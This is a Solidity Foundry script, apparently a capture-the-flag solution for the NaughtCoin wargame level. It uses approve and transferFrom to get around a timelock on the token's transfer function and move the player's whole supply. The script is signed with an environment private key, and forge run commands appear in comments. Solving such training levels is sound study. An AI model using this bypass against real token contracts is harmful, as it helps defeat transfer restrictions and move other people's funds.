// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {NaughtCoin} from "../src/NaughtCoin.sol";

contract NaughtCoinHack is Script {
    address player = 0x1faF0b93E7A1d980a41270FCCeD7bC0F30dBf8fe;
    NaughtCoin public naughtCoin =
        NaughtCoin(0x75d5B2B9a623C573821d5AF20900ac812cC14943);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log(
            "Balance of player before hack",
            naughtCoin.balanceOf(player)
        );

        naughtCoin.approve(player, naughtCoin.INITIAL_SUPPLY());
        naughtCoin.transferFrom(
            player,
            address(this),
            naughtCoin.INITIAL_SUPPLY()
        );

        console.log(
            "Balance of player  after hack",
            naughtCoin.balanceOf(player)
        );

        vm.stopBroadcast();
    }
}

// forge script script/NaughtCoin.s.sol -vv --tc NaughtCoinHack
// forge script script/NaughtCoin.s.sol -vv --tc NaughtCoinHack --broadcast
